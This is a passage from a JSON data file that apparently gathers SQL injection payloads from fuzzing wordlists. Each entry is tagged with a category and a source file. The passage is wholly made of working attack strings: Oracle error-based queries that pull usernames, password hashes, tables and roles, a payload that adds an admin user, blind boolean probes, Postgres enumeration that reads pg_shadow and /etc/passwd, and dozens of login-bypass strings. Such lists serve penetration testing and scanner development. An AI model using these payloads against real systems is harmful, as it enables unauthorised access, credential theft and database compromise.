    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' || myappadmin.adduser('admin', 'newpass') || '",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "OR 3409=3409 AND ('pytW' LIKE 'pytW",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "OR 3409=3409 AND ('pytW' LIKE 'pytY",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "AND 1=1 AND '%'='",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "AND 1=0 AND '%'='",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "AND 1083=1083 AND ('1427=1427",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "AND 7506=9091 AND ('5913=5913",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "AND 7300=7300 AND 'pKlZ'='pKlZ",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "AND 7300=7300 AND 'pKlZ'='pKlY",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "AND 7300=7300 AND ('pKlZ'='pKlZ",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "AND 7300=7300 AND ('pKlZ'='pKlY",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "%' AND 8310=8310 AND '%'='",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "%' AND 8310=8311 AND '%'='",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "and (select substring(@@version,1,1))='X'",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "and (select substring(@@version,1,1))='M'",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "and (select substring(@@version,2,1))='i'",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "and (select substring(@@version,2,1))='y'",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "and (select substring(@@version,3,1))='c'",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "and (select substring(@@version,3,1))='S'",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "and (select substring(@@version,3,1))='X'",
    "category": "sql injection",
    "source_file": "Generic_ErrorBased.txt"
  },
  {
    "payload": "select version();",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_database();",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_user;",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select session_user;",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('log_connections');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('log_statement');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('port');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('password_encryption');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('krb_server_keyfile');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('virtual_host');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('config_file');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('hba_file');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select current_setting('data_directory');",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select * from pg_shadow;",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select * from pg_group;",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "create table myfile (input TEXT);",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "copy myfile from '/etc/passwd';",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "select * from myfile;copy myfile to /tmp/test;",
    "category": "sql injection",
    "source_file": "FUZZDB_Postgres_Enumeration.txt"
  },
  {
    "payload": "' and 1='1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' and a='a",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or ''='",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or \"\"=\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "1\u2032) and '1\u2032='1\u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" AND 1=0 UNION ALL SELECT \"\", \"81dc9bdb52d04dc20036dbd8313ed055",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' and 'one'='one",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' and 'one'='one\u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' group by password having 1=1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' group by userid having 1=1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' group by username having 1=1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "like '%'",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or         0=0 #",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 0=0 ",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 0=0 #",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 0=0 \u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 0=0 ",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 0=0 #",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 0=0 \u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "%' or '0'='0",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 1=1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or '1'='1'",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or '1'='1'/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or '1'='1'#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or '1\u2032='1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 1=1 \u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 1=1;#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 1=1/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 1=1#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 1=1\u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or '1'='1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or '1'='1'",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or '1'='1'/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or '1'='1'#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or ('1'='1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or ('1'='1'",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or ('1'='1'/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or ('1'='1'#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "'or'1=1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "'or'1=1\u2032",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or \"1\"=\"1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or \"1\"=\"1\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or \"1\"=\"1\"/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or \"1\"=\"1\"#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 1=1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 1=1 ",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 1=1 \u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 1=1/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 1=1#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or 1=1\u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or \"1\"=\"1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or \"1\"=\"1\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or \"1\"=\"1\"/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or \"1\"=\"1\"#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or (\"1\"=\"1",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or (\"1\"=\"1\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or (\"1\"=\"1\"/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or (\"1\"=\"1\"#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": ") or '1\u2032='1\u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": ") or ('1\u2032='1\u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 1=1 LIMIT 1;#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "'or 1=1 or ''='",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\"or 1=1 or \"\"=\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 'a'='a",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or a=a",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or a=a\u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or ('a'='a",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\" or \"a\"=\"a",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "\") or (\"a\"=\"a",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or ('a'='a and hi\") or (\"a\"=\"a",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 'one'='one",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 'one'='one\u2013",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or uid like '%",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or uname like '%",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or userid like '%",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or user like '%",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or username like '%",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "') or ('x'='x",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' OR 'x'='x'#;",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "'=' 'or' and '=' 'or'",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' UNION ALL SELECT 1, @@version;#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' UNION ALL SELECT system_user(),user();#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' UNION select table_schema,table_name FROM information_Schema.tables;#",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "admin' and substring(password/text(),1,1)='7",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' and substring(password/text(),1,1)='7",
    "category": "sql injection",
    "source_file": "Auth_Bypass2.txt"
  },
  {
    "payload": "' or 1=1 limit 1 -- -+",
    "category": "sql injection",
